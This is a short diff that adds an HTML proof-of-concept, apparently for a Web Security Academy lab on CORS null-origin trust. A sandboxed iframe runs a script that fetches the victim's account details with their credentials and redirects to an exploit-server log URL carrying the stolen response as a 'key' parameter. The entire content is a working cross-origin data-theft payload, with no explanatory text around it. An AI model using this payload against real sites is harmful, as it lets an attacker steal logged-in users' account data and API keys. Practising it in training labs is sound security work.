@@ -1,0 +1,10 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0add008703faf29c803b03de009100cf.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-0abc006a036af2fa8095025e01380008.exploit-server.net/exploit/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
